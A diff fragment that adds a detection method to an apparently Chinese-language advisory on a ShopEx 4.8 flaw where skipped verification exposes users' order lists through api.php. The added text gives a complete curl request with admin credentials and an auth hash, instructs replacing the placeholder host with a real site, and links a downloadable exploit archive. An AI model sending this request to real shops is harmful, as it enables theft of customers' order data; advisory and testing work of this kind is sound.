@@ -39,6 +39,19 @@ ShopEx48系列 <= 45144
 中是否跳过验证'n_varify'设置为true,导致不需要验证也可以获取用户订单列表
 
 ====检测方法====
+
+方法1
+
+```
+
+curl -d "act=search_order_list&api_version=1.0&counts=50&last_modify_st_time=0&last_modify_en_time=300000000000&pages=0&password=gkk522004&status=active&tolken=&username=admin&ac=C30F2929C886AA28CF5F0276729374C5" http://www.xxx.com/api.php
+
+```
+
+http://www.xxx.com换成用户的实际地址！
+
+方法2：
+
 下载这个程序
 
 http://shopexts.googlecode.com/files/shopex.api.ordersearch.vul.rar
